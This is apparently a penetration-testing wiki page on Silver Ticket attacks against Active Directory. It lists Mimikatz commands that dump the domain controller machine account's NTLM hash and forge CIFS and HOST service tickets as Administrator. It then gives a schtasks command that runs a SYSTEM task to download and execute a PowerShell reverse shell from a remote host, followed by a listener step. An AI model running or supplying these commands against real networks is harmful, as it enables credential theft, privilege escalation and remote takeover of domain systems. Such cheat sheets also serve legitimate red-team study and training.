---
description: Silver Ticket
---

# Silver Ticket

> If we have access to the NTLM hash of the service account, we can forge a TGS and present it to the application server (we can access the service as any user, including privileged ones).

* This involves in abusing step 5 of the kerberos authentication mechanism.
* All the interesting services on a machine run or use the machine account as the service account (cifs, host, wmi...)
* In this case, we will be targeting the machine account of the DC.

### Methodology

1. Get the NTLM hash of the DC machine:

```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName $COMPUTER_NAME #We can delete -ComputerName if done in the DC.
```

1. Create a SilverTicket for a specific service (CIFS in this case):

```bash
Invoke-Mimikatz -Command '"kerberos::golden /domain:$DOMAIN_FQDN /sid:$DOMAIN_SID /target:$TARGET_SERVER_FQDN /service:CIFS /rc4:$NTLM_HAHS_SERVICE /user:Administrator /ppt"'
```

1. Access the service:

```bash
ls \\$TARGET_SERVER_FQDN\c$
```

***

### Get command execution using Silver Ticket

1. Create a Silver Ticket for the "HOST" SPN which will allow us to schedule a task on the target:

```bash
Invoke-Mimikatz -Command '"kerberos::golden /domain:$DOMAIN_FQDN /sid:$DOMAIN_SID /target:$TARGET_SERVER_FQDN /service:HOST /rc4:$NTLM_HAHS_SERVICE /user:Administrator /ppt"'
```

1. Schedule a task:

```bash
schtasks /create /S $SERVER_FQDN /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net-WebClient).DownloadString(''http://xx/Invoke-PowerShellTcp.ps1''')'"
#Note: Remember to call the function at the end of the script!
```

1. Start a listener.
2. Run the task:

```bash
schtasks /Run /S $SERVER_FQDN /TN "STCheck"
```

***

### Command execution using "WMI"

[Hack-Tricks HOST+RPCSS SPN Code Execution](https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket)

***

### Other SPNs

[List of SPNs](https://adsecurity.org/?page\_id=183)
